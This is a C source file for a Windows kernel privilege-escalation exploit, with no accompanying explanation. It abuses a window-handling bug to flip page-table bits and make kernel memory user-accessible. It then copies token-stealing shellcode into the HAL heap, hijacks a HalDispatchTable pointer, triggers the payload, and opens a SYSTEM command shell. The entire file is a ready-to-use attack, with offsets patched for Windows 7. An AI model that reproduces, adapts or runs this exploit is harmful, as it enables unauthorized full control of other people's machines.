#include <windows.h> //UINT BLA BLA BLA
#include <stdio.h> //FOR SURE



#pragma comment(lib,"user32.lib") //CREATE NEW WINDOW

char OutputTab[8] = "\t\t\t\t\t\t\t\x00";
char shellcode[] = {
	0xfa, 															// CLI
	0x9c, 															// PUSHFQ
	0x48, 0xb8, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  	// MOV RAX, Original Pointer
	0x50, 															// PUSH RAX
	0x51, 															// PUSH RCX
	0x48, 0xb9, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  	// MOV RCX, [OverwriteAddr+OverwriteOffset]
	0x48, 0x89, 0x01,  												// MOV    QWORD PTR [RCX], RAX
	0xb9, 0x90, 0x90, 0x90, 0x90,  									// MOV ECX, PID
	0x53, 															// PUSH RBX

	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  			// MOV    RAX,QWORD PTR gs:0x188
	0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,						// MOV    RAX,QWORD PTR [RAX+0xb8] EPROCESS
	0x48, 0x8d, 0x80, 0x90, 0x90, 0x00, 0x00,						// LEA    RAX,[RAX+0xActiveProcessLinkOffset] 
	//<tag>
	0x48, 0x8b, 0x00,												// MOV    RAX,QWORD PTR [RAX]
	0x48, 0x8b, 0x58, 0xf8,											// MOV    RBX,QWORD PTR [RAX-0x8] // UniqueProcessID
	0x48, 0x83, 0xfb, 0x04,											// CMP    RBX,0x4
	0x75, 0xf3,														// JNE    <tag>
	0x48, 0x8b, 0x98, 0x90, 0x90, 0x90, 0x90,						// MOV    RBX, QWORD PTR [RAX+0x60] // GET TOKEN of SYSTEM

	0x53, 															// PUSH RBX
	//<tag2>
	0x48, 0x8b, 0x00,												// MOV    RAX,QWORD PTR [RAX]
	0x48, 0x8b, 0x58, 0xf8,											// MOV    RBX,QWORD PTR [RAX-0x8] // UniqueProcessID
	0x39, 0xcb,														// CMP    EBX, ECX // our PID
	0x75, 0xf5,														// JNE    <tag2>
	0x5b, 															// POP RBX
	0x48, 0x89, 0x98, 0x90, 0x90, 0x90, 0x90,						// MOV    QWORD PTR[RAX + 0x60], RBX

	0x5b, // POP RBX
	0x59, // POP RCX
	0x58, // POP RAX
	0x9d, // POPFQ

	0xfb, // STI
	0xff, 0xe0 // JMP RAX
};


//PML4 stuf
UINT64	PML4_BASE;
UINT	PML4_SELF_REF_INDEX;
UINT64	PML4_SELF_REF = 0xFFFFF6FB7DBEDF68;
#define GET_INDEX(va)  ( ((va >> 39) & 0x1ff )) 

//CALL SOME NT TO GET HalDispatchTable + Control IP
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	PVOID  Unknown1;
	PVOID  Unknown2;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;
typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG ReturnLength);
typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
	OUT PULONG Interval);
NtQuerySystemInformation_t NtQuerySystemInformation;
NtQueryIntervalProfile_t NtQueryIntervalProfile;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

//Trigger the BUG
int _sim_key_down(WORD wKey){
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = 0;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}
int _sim_key_up(WORD wKey){
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = KEYEVENTF_KEYUP;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}
void OR_4_To_This_ADDR(UINT64 ADDR, int NumTab){
	int changedFlag = 0;
	while (changedFlag == 0)
	{
		WNDCLASSEXW stWC = { 0 };
		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = L"HACKER";
		RegisterClassExW(&stWC);

		HWND	hWndParent = CreateWindowExW(0, L"HACKER", L"HACKER", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 360, 360, NULL, NULL, GetModuleHandleW(NULL), NULL);
		HWND	hWndChild = CreateWindowExW(0, L"HACKER", L"HACKER", WS_OVERLAPPEDWINDOW | WS_VISIBLE | WS_CHILD,	0, 0, 160, 160, hWndParent, NULL, GetModuleHandleW(NULL), NULL);
		SetWindowLongPtr(hWndChild, GWLP_ID, ADDR - 0x28);
		SetParent(hWndChild, GetDesktopWindow());
		SetForegroundWindow(hWndChild);
		SetFocus(hWndParent);
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);
		_sim_key_up(VK_MENU);
		DestroyWindow(hWndParent);
		DestroyWindow(hWndChild);
		UnregisterClassW(L"HACKER", GetModuleHandleW(NULL));
		__try {
			printf("%s*%llx = %llx\n", &OutputTab[7-NumTab], ADDR, *(UINT64 *)ADDR);
			if ((*(UINT64 *)ADDR & 0x4) == 0x4)
			{
				changedFlag = 1;
			}
			else
			{
				printf("%sTrying again ...\n", &OutputTab[7-NumTab], ADDR);
			}
			
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			printf("%sFAIL TO READ THIS ADDR: %llx\nTrying again ...\n", &OutputTab[7-NumTab], ADDR);
		}
	}
}

//Exploit func
UINT64 GetHalDispatchTable() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    UINT64 HalDispatchTable;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    hNtDll = LoadLibrary("ntdll.dll");

    if (!hNtDll) {
        printf("[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        printf("[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);

    if (!pSystemModuleInformation) {
        printf("[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);

    if (NtStatus != STATUS_SUCCESS) {
        printf("[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    printf("[+] Loaded Kernel: %s\n", KernelImage);
    printf("[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);
    
    hKernelInUserMode = LoadLibraryA(KernelImage);

    if (!hKernelInUserMode) {
        printf("[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    // This is still in user mode
    HalDispatchTable = (UINT64)GetProcAddress(hKernelInUserMode, "HalDispatchTable");

    if (!HalDispatchTable) {
        printf("[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        HalDispatchTable = (ULONGLONG)HalDispatchTable - (ULONGLONG)hKernelInUserMode;

        // Here we get the address of HapDispatchTable in Kernel mode
        HalDispatchTable = ((ULONGLONG)HalDispatchTable + (ULONGLONG)KernelBaseAddressInKernelMode);
        printf("[+] HalDispatchTable: 0x%llx\n", HalDispatchTable);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;

    return HalDispatchTable;
}
UINT64 get_pxe_address(UINT64 address) {
	UINT entry = PML4_SELF_REF_INDEX;
	UINT64 result = address >> 9;
	UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 39);
	UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8;
	//printf ("%llx\n %llx\n", lower_boundary, upper_boundary);
	result = result | lower_boundary;
	result = result & upper_boundary;
	return result;
}
void Set_UserMod_on_this_ADDR(UINT64 ADDR, int NumTab){
	
	printf("[+] Setting UserMod on this ADDR: %llx ...\n",ADDR );
	UINT64 pte = get_pxe_address(ADDR);
	UINT64 pde = get_pxe_address(pte);
	UINT64 ppe = get_pxe_address(pde);
	UINT64 pxe = get_pxe_address(ppe);
	printf("%sEditing PTE:\n", &OutputTab[7-NumTab],ADDR );
	printf("%sPXE:\n", &OutputTab[7-NumTab]);
	OR_4_To_This_ADDR(pxe, NumTab+1);
	printf("%sPPE:\n", &OutputTab[7-NumTab]);
	OR_4_To_This_ADDR(ppe, NumTab+1);
	printf("%sPDE:\n", &OutputTab[7-NumTab]);
	OR_4_To_This_ADDR(pde, NumTab+1);
	printf("%sPTE:\n", &OutputTab[7-NumTab]);
	OR_4_To_This_ADDR(pte, NumTab+1);
	int accessableFlag = 0;
	while (accessableFlag == 0)
	{
		__try {
			printf("%s*%llx = %llx\n", &OutputTab[7-NumTab], ADDR,*(UINT64 *)(ADDR));
			accessableFlag = 1;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			printf("%sFAIL TO READ THIS ADDR: %llx\n", &OutputTab[7-NumTab], ADDR);
			printf("%sTrying again ...\n", &OutputTab[7-NumTab]);
		}
	}
}

void CallNtQueryIntervalProfile(){
	HMODULE hNtDll = LoadLibrary("ntdll.dll");

	if (!hNtDll) {
		printf("\t\t[-] Failed loading NtDll: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		printf("\t\t[-] Failed Resolving NtQueryIntervalProfile: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	ULONG Interval = 0;
	NtQueryIntervalProfile(0x1337, &Interval);
}

int main(){
	PML4_SELF_REF_INDEX = GET_INDEX((UINT64)PML4_SELF_REF);
	getchar();

	printf ("[+] Getting access on 0xFFFFF6FB7DBEDF68 (PTE)\n");
	OR_4_To_This_ADDR(0xFFFFF6FB7DBEDF68, 1);
	UINT64 HalDispatchTableAddr = GetHalDispatchTable();
	Set_UserMod_on_this_ADDR(HalDispatchTableAddr, 1);
	UINT64 ORIGINAL_HalDispatchTable_0x8_Value = *(UINT64 *)(HalDispatchTableAddr+0x8);
	Set_UserMod_on_this_ADDR(0xFFFFFFFFFFD04000, 1); //HAL HEAP
	
	

	//Patch Shellcode for win 7
	unsigned char sc_KPROCESS = 0x70;
	unsigned int sc_TOKEN = 0x80;
	unsigned int sc_APLINKS = 0x188;
	DWORD pid = GetCurrentProcessId();
	char *p = shellcode;
	p += 4; // Make sure it jump to original pointer in hal table after run the shell
	*(UINT64 *)p = (UINT64)(ORIGINAL_HalDispatchTable_0x8_Value); // Patch shellcode1
	p += 12; // give the original pointer back 
	*(UINT64 *)p = (UINT64)(HalDispatchTableAddr+0x8);
	p += 12; // To patch the PID of our process
	*(DWORD *)p = (DWORD)GetCurrentProcessId();
	p += 17;
	*(unsigned char *)p = (unsigned char)sc_KPROCESS;
	p += 7;
	*(unsigned int *)p = (unsigned int)sc_APLINKS;
	p += 20;
	*(unsigned int *)p = (unsigned int)sc_TOKEN;
	p += 20;
	*(unsigned int *)p = (unsigned int)sc_TOKEN;

	memcpy(0xFFFFFFFFFFD04000, shellcode, 111);
	
	*(UINT64 *)(HalDispatchTableAddr+0x8)=0xFFFFFFFFFFD04000;
	CallNtQueryIntervalProfile();
	system("cmd.exe");
	
	
	
	
	
	
	
	
	getchar();

}